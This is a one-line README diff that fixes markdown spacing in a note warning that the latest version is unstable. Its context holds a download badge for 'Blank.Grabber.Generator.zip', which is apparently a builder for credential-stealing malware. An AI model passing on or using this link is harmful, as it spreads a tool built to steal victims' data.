@@ -1,4 +1,4 @@
-##Note: Latest version is unstable in most devices so I recommend you to use previous versions!
+## Note: Latest version is unstable in most devices so I recommend you to use previous versions!
 
 ### Download
 [![Download](https://img.shields.io/badge/Download-Latest_Version-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/releases/latest/download/Blank.Grabber.Generator.zip)
